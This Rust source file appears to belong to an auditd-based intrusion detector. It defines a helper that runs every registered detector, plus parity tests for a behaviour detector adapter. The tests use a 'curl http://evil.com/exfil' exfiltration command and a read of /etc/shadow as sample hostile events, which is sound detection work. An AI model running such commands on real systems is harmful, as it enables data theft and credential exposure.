use crate::detect::traits::{AlertProposal, DetectionEvent, Detector};

/// Execute all registered detectors against a normalized event and collect
/// all resulting proposals.
///
/// Phase 2 note:
/// This helper is intentionally not yet wired into the main runtime loop.
/// It provides a stable execution primitive for parity tests and incremental
/// migration from hardcoded detector calls.
pub fn run_detectors(
    detectors: &[Box<dyn Detector>],
    event: &DetectionEvent,
) -> Vec<AlertProposal> {
    let mut proposals = Vec::new();
    for detector in detectors {
        proposals.extend(detector.evaluate(event));
    }
    proposals
}

#[cfg(test)]
mod tests {
    use std::collections::HashMap;

    use crate::alerts::Severity;
    use crate::auditd::{Actor, ParsedEvent};
    use crate::behavior;
    use crate::detect::behavior_adapter::BehaviorDetector;
    use crate::detect::traits::DetectionEvent;

    use super::run_detectors;

    fn make_detection_event(command: Option<&str>, args: &[&str], file_path: Option<&str>) -> DetectionEvent {
        let mut fields = HashMap::new();
        fields.insert("syscall_name".to_string(), "execve".to_string());
        fields.insert("success".to_string(), "true".to_string());

        if let Some(cmd) = command {
            fields.insert("command".to_string(), cmd.to_string());
        }
        if !args.is_empty() {
            let as_json = serde_json::to_string(&args.iter().map(|s| s.to_string()).collect::<Vec<_>>())
                .unwrap_or_else(|_| "[]".to_string());
            fields.insert("args".to_string(), as_json);
        }
        if let Some(path) = file_path {
            fields.insert("file_path".to_string(), path.to_string());
            fields.insert("syscall_name".to_string(), "openat".to_string());
        }

        DetectionEvent {
            source: "auditd".to_string(),
            event_type: fields
                .get("syscall_name")
                .cloned()
                .unwrap_or_else(|| "execve".to_string()),
            fields,
            raw: None,
        }
    }

    fn make_parsed_event(command: Option<&str>, args: &[&str], file_path: Option<&str>) -> ParsedEvent {
        ParsedEvent {
            syscall_name: if file_path.is_some() {
                "openat".to_string()
            } else {
                "execve".to_string()
            },
            command: command.map(|s| s.to_string()),
            args: args.iter().map(|s| s.to_string()).collect(),
            file_path: file_path.map(|s| s.to_string()),
            success: true,
            raw: String::new(),
            actor: Actor::Unknown,
            ppid_exe: None,
        }
    }

    fn severity_to_label(sev: Severity) -> &'static str {
        match sev {
            Severity::Critical => "critical",
            Severity::Warning => "warning",
            Severity::Info => "info",
        }
    }

    #[test]
    fn behavior_adapter_parity_for_exfil_command() {
        let detection = make_detection_event(
            Some("curl http://evil.com/exfil"),
            &["curl", "http://evil.com/exfil"],
            None,
        );
        let parsed = make_parsed_event(
            Some("curl http://evil.com/exfil"),
            &["curl", "http://evil.com/exfil"],
            None,
        );

        let baseline = behavior::classify_behavior(&parsed);
        let detectors: Vec<Box<dyn crate::detect::traits::Detector>> =
            vec![Box::new(BehaviorDetector::new())];
        let proposals = run_detectors(&detectors, &detection);

        assert!(baseline.is_some(), "baseline behavior classifier should detect exfil command");
        assert_eq!(proposals.len(), 1, "runner should return one behavior proposal");

        let (baseline_cat, baseline_sev) = baseline.expect("checked is_some");
        let p = &proposals[0];
        assert_eq!(p.severity, severity_to_label(baseline_sev));
        assert!(p.rule_id.contains(&baseline_cat.to_string().to_lowercase()));
    }

    #[test]
    fn behavior_adapter_parity_for_benign_command() {
        let detection = make_detection_event(Some("ls -la /tmp"), &["ls", "-la", "/tmp"], None);
        let parsed = make_parsed_event(Some("ls -la /tmp"), &["ls", "-la", "/tmp"], None);

        let baseline = behavior::classify_behavior(&parsed);
        let detectors: Vec<Box<dyn crate::detect::traits::Detector>> =
            vec![Box::new(BehaviorDetector::new())];
        let proposals = run_detectors(&detectors, &detection);

        assert!(baseline.is_none(), "baseline behavior classifier should ignore benign command");
        assert!(proposals.is_empty(), "runner should preserve benign no-alert behavior");
    }

    #[test]
    fn behavior_adapter_parity_for_sensitive_file_syscall() {
        let detection = make_detection_event(None, &[], Some("/etc/shadow"));
        let parsed = make_parsed_event(None, &[], Some("/etc/shadow"));

        let baseline = behavior::classify_behavior(&parsed);
        let detectors: Vec<Box<dyn crate::detect::traits::Detector>> =
            vec![Box::new(BehaviorDetector::new())];
        let proposals = run_detectors(&detectors, &detection);

        assert!(baseline.is_some(), "baseline behavior classifier should detect sensitive file access");
        assert_eq!(proposals.len(), 1, "runner should return one behavior proposal");

        let (_, baseline_sev) = baseline.expect("checked is_some");
        let p = &proposals[0];
        assert_eq!(p.severity, severity_to_label(baseline_sev));
        assert!(p.tags.iter().any(|t| t == "event:openat"));
    }
}